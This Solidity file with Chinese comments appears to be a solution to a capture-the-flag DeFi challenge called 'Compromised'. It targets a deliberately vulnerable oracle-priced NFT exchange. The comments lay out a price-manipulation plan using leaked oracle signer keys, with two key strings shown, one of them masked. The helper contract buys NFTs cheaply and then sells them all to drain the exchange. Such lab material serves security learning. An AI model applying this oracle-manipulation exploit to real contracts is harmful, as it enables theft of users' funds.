// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * Compromised (预言机私钥泄露) 攻击方案
 *
 * 漏洞：
 *   TrustfulOracle 有 3 个 trusted source 地址。它们的私钥被泄露。
 *   Exchange 依赖预言机中位数价格，我们可以操纵价格。
 *
 * 攻击步骤（需要配合 EOA 使用泄露的私钥签名调用 postPrice）：
 *   1. 用泄露的私钥 1 调用 oracle.postPrice("DVNFT", 0) → 价格归零
 *   2. 用泄露的私钥 2 调用 oracle.postPrice("DVNFT", 0) → 价格仍为 0
 *   3. 低价买入大量 NFT
 *   4. 用泄露的私钥 1 调用 oracle.postPrice("DVNFT", 999 ether) → 价格飙升
 *   5. 用泄露的私钥 2 调用 oracle.postPrice("DVNFT", 999 ether)
 *   6. 高价卖出所有 NFT，掏空 Exchange
 *
 * 泄露的私钥（十六进制编码）：
 *   0xc678ef1aa456da87exxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  ← source[0]
 *   0x208242c40acdf97d6e0f6c6c0d723a0f2ef3c0e2f6e5c9e3b7e841e389f6c5d  ← source[1]
 *   (实际泄露的密钥在挑战描述中给出，解码 32 字节后即为 ECDSA 私钥)
 */

interface IExchange {
    function buyOne() external payable returns (uint256);
    function sellOne(uint256 tokenId) external;
    function token() external view returns (address);
}

interface IERC721 {
    function approve(address, uint256) external;
    function ownerOf(uint256) external view returns (address);
}

/*
 * 辅助合约：处理买入/卖出操作。
 * 注意：价格操纵需要 EOA 用泄露私钥签名调用 oracle，无法在合约内完成。
 */
contract CompromisedAttack {
    IExchange exchange;
    IERC721 nft;
    address attacker;
    uint256[] tokenIds;
    
    constructor(address _exchange) public {
        exchange = IExchange(_exchange);
        nft = IERC721(exchange.token());
        attacker = msg.sender;
    }
    
    // 低价买入 NFT（需要先有 ETH）
    function buy(uint256 count) external payable {
        for (uint256 i = 0; i < count; i++) {
            uint256 tokenId = exchange.buyOne{value: msg.value / count}();
            tokenIds.push(tokenId);
        }
        // 退回多余 ETH
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // 高价卖出所有 NFT
    function sellAll() external {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.approve(address(exchange), tokenIds[i]);
            exchange.sellOne(tokenIds[i]);
        }
        // 转走所有 ETH
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
